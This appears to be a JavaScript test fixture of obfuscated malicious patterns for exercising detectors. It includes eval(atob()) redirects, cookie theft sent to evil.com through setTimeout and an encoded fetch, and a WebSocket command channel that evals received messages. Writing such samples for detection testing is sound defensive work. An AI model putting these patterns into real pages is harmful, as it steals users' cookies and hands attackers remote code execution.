// MALICIOUS TEST SAMPLE — DO NOT RUN.
// Obfuscated JavaScript for testing detectors.

// Classic eval(atob()) pattern
eval(atob("ZG9jdW1lbnQubG9jYXRpb24gPSAnaHR0cDovL2V2aWwuY29tJw=="));

// Function constructor (equivalent to eval)
var fn = new Function("return document.cookie");
fn();

// setTimeout with string (acts as eval)
setTimeout("document.location='http://evil.com/steal?c='+document.cookie", 1000);

// Encoded fetch to external URL
fetch(atob("aHR0cDovL2V2aWwuY29tL2V4ZmlsP2Q9"));

// Obfuscated WebSocket C2
var ws = new WebSocket("ws://192.168.1.100:8888/c2");
ws.onmessage = function(e) { eval(e.data); };
